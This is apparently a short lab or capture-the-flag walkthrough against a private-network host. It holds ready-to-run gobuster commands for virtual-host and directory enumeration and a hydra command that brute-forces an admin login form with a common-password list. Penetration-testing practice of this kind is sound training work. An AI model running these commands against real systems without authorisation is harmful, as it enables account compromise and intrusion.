## h 4.1 p
```bash
#Open https://192.168.100.154/ in browser and check 'View Certificate' -> 'Common Name' (developer)
echo '192.168.100.154 developer' | sudo tee -a /etc/hosts
#Open https://developer/ in browser
```

## h 4.2 p
```bash
gobuster vhost -u https://developer/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --domain developer --append-domain -k
#Found beta.developer
echo '192.168.100.154 beta.developer' | sudo tee -a /etc/hosts
#Open https://beta.developer/ in browser
```

## h 4.3 p
```bash
gobuster dir -u https://beta.developer/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -k
#Open https://beta.developer/admin/ in browser
```

## h 4.4 p
```bash
gobuster dir -u https://beta.developer/admin/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt -k
```

## h 4.5 p
```bash
hydra -l anything -P /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-100.txt 'https-post-form://beta.developer/admin/index_admin.php:p=^PASS^:Wrong password'
```
